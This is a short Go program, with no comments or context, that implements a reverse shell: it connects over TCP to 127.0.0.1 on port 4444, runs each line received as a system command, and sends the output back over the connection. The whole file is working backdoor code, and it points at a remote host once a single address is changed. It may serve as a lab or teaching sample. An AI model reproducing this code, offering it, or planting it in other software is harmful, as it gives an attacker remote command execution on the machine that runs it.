package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:4444")
	if err != nil {
		fmt.Println(err)
		return
	}
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}
		fmt.Fprintf(conn, "%s\n", outputToString(out))
	}
}

func outputToString(output []byte) string {
	return string(bytes.Trim(output, "\r\n"))
}
